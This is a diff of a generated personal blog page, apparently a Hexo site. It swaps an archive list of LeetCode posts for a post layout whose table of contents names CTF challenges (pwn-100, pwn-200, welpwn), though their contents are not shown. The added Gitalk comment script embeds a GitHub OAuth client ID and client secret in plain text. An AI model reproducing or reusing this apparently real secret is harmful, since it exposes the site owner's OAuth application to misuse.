-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">reverse</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
+        
+        
+        <div class="toc-container tooltip-left">
+            <i class="icon-font icon-category"></i>
+            <div class="tooltip tooltip-east">
+                <span class="tooltip-item">
+                </span>
+                <span class="tooltip-content">
+                    <div class="toc-article">
+                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#pwn-100"><span class="toc-number">1.</span> <span class="toc-text">pwn-100</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#pwn-200"><span class="toc-number">2.</span> <span class="toc-text">pwn-200</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#welpwn"><span class="toc-number">3.</span> <span class="toc-text">welpwn</span></a></li></ol>
+                    </div>
+                </span>
+            </div>
         </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
+        
+    </div>
+</aside>
+
+
+
   
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2020/11/22/leetcode/leetcode%20%E7%AE%80%E5%8D%95%E9%9A%BE%E5%BA%A6%20%E7%BD%97%E9%A9%AC%E6%95%B0%E5%AD%97%E8%BD%AC%E6%95%B4%E6%95%B0/" class="archive-article-date">
-  	<time datetime="2020-11-21T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-11-22</time>
-</a>
-        </div>
-    	 
   
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2020/11/22/leetcode/leetcode%20%E7%AE%80%E5%8D%95%E9%9A%BE%E5%BA%A6%20%E7%BD%97%E9%A9%AC%E6%95%B0%E5%AD%97%E8%BD%AC%E6%95%B4%E6%95%B0/">leetcode 罗马数字转整数</a>
-    </h1>
   
 
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">acm</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">leetcode</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2020/11/22/leetcode/leetcode%20%E7%AE%80%E5%8D%95%E9%9A%BE%E5%BA%A6%20%E6%9C%89%E6%95%88%E7%9A%84%E6%8B%AC%E5%8F%B7/" class="archive-article-date">
-  	<time datetime="2020-11-21T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-11-22</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2020/11/22/leetcode/leetcode%20%E7%AE%80%E5%8D%95%E9%9A%BE%E5%BA%A6%20%E6%9C%89%E6%95%88%E7%9A%84%E6%8B%AC%E5%8F%B7/">leetcode 有效的括号</a>
-    </h1>
   
 
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">acm</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">leetcode</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">栈</a>
-        		</li>
-      		
-		</ul>
-	</div>
 
-          
+	<div id="gitalk-container"></div>
+	<link rel="stylesheet" href="https://unpkg.com/gitalk@latest/dist/gitalk.css">
+<script src="https://unpkg.com/gitalk@latest/dist/gitalk.min.js"></script>
+<script src="https://priesttomb.github.io/js/md5.min.js"></script>
+<script type="text/javascript">
+    new Gitalk({
+        clientID: '33931d9e122463275cdd',
+        clientSecret: 'd5606411ea5f6bfd13d4a1603a38dc4f77046949',
+        repo: 'qingmu-z.github.io',
+        owner: 'qingmu-z',
+        admin: 'qingmu-z',
+        id: md5(location.pathname),
+        distractionFreeMode: true
+    }).render('gitalk-container')
+</script>
 
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2020/11/22/%E4%BF%A1%E6%81%AF%E5%AD%A6%E5%A5%A5%E8%B5%9B%E4%B8%80%E6%9C%AC%E9%80%9A/%E9%AB%98%E7%B2%BE%E5%BA%A6%E8%AE%A1%E7%AE%97/" class="archive-article-date">
-  	<time datetime="2020-11-21T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-11-22</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2020/11/22/%E4%BF%A1%E6%81%AF%E5%AD%A6%E5%A5%A5%E8%B5%9B%E4%B8%80%E6%9C%AC%E9%80%9A/%E9%AB%98%E7%B2%BE%E5%BA%A6%E8%AE%A1%E7%AE%97/">信息学奥赛一本通 高精度计算</a>
-    </h1>
+
   
 
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">acm</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">算法</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">信息学奥赛一本通</a>
-        		</li>
-      		
-		</ul>
-	</div>
 
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2020/11/20/leetcode/leetcod%20%E7%AE%80%E5%8D%95%E9%9A%BE%E5%BA%A6%20%E6%95%B4%E6%95%B0%E5%8F%8D%E8%BD%AC/" class="archive-article-date">
-  	<time datetime="2020-11-19T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-11-20</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2020/11/20/leetcode/leetcod%20%E7%AE%80%E5%8D%95%E9%9A%BE%E5%BA%A6%20%E6%95%B4%E6%95%B0%E5%8F%8D%E8%BD%AC/">leetcode 整数反转</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">acm</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">leetcode</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2020/11/20/leetcode/leetcode%20%E7%AE%80%E5%8D%95%E9%9A%BE%E5%BA%A6%20%E5%9B%9E%E6%96%87%E6%95%B0/" class="archive-article-date">
-  	<time datetime="2020-11-19T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-11-20</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2020/11/20/leetcode/leetcode%20%E7%AE%80%E5%8D%95%E9%9A%BE%E5%BA%A6%20%E5%9B%9E%E6%96%87%E6%95%B0/">leetcode 回文数</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">acm</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">leetcode</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2020/11/20/leetcode/leetcode%20%E4%B8%A4%E6%95%B0%E4%B9%8B%E5%92%8C%20%E6%A2%A6%E5%BC%80%E5%A7%8B%E7%9A%84%E5%9C%B0%E6%96%B9%E3%80%82%E3%80%82%E3%80%82/" class="archive-article-date">
-  	<time datetime="2020-11-19T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-11-20</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2020/11/20/leetcode/leetcode%20%E4%B8%A4%E6%95%B0%E4%B9%8B%E5%92%8C%20%E6%A2%A6%E5%BC%80%E5%A7%8B%E7%9A%84%E5%9C%B0%E6%96%B9%E3%80%82%E3%80%82%E3%80%82/">leetcode 两数之和 梦开始的地方。。。</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">acm</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">leetcode</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">哈希</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-  
-    </div></section>
-  
-
-    
-    <nav id="page-nav">
-      <a class="extend prev" rel="prev" href="/archives/page/2/">&amp;laquo; Prev</a><a class="page-number" href="/archives/">1</a><a class="page-number" href="/archives/page/2/">2</a><span class="page-number current">3</span>
-    </nav>
   
 
 
@@ -632,8 +527,8 @@ color="0,0,255" opacity='0.9' zIndex="-1" count="300" src="//cdn.bootcss.com/can
 	var yiliaConfig = {
 		mathjax: true,
 		isHome: false,
-		isPost: false,
-		isArchive: true,
+		isPost: true,
+		isArchive: false,
 		isTag: false,
 		isCategory: false,
 		open_in_new: false,
